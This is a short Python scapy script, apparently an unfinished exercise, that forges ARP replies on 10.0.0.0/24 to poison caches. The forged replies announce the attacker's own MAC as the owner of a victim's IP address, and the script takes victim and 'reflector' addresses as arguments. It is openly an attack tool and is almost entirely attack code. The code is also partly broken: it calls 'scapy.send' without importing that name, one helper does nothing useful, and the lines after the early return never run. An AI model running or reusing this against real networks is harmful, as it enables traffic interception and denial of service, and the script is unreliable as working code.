#!/usr/bin/env python3
from scapy.all import *


def spoof(spoof_ip, spoof_mac):        
    packet = Ether(src=spoof_mac,  dst="ff:ff:ff:ff:ff:ff")/ ARP(op=2, pdst="10.0.0.0/24",psrc=spoof_ip)    
    scapy.send(packet)

def get_mac_localhost():
    ans = ARP(pdst="127.0.0.1")
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.0.0.5"), timeout=2)
    
def main():
    if __name__ == '__main__':
        import argparse
        parser = argparse.ArgumentParser()
        parser.add_argument('--interface', required=True)
        parser.add_argument('--victim-ip', required=True)
        parser.add_argument('--victim-ethernet', required=True)
        parser.add_argument('--reflector-ip', required=True)
        parser.add_argument('--reflector-ethernet', required=True)
        args=parser.parse_args()
        print(args)
        
   

    own_mac = get_if_hwaddr(args.interface)
    spoof(args.victim_ip, own_mac)
    return
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.0.0.0/24")
    ans, unans = srp(pkt, timeout=2)
    ans.summary(lambda s,r: r.sprintf("%Ether.src% %ARP.psrc%") )

main()